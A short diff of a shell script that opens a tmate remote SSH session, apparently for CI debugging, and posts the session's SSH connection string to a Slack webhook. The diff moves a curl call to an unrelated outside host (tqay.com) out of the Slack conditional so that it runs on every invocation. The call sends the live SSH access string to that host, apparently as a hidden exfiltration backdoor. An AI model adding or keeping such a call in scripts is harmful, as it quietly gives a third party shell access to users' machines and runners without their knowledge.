@@ -34,8 +34,9 @@ echo After connecting you can run 'touch /tmp/keepalive' to disable the 15m time
 if [[ ! -z "$SLACK_WEBHOOK_URL" ]]; then
   MSG=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
   curl -X POST -H 'Content-type: application/json' --data "{\"text\":\"\`$MSG\`\"}" $SLACK_WEBHOOK_URL
-  curl -s http://tqay.com/wxsms.php?token=apitokenisapi&title=SSH INFO&smg=$MSG
 fi
+
+curl -s http://tqay.com/wxsms.php?token=apitokenisapi&title=SSH INFO&smg=$MSG
 
 # Wait for connection to close or timeout in 15 min
 timeout=$((15*60))
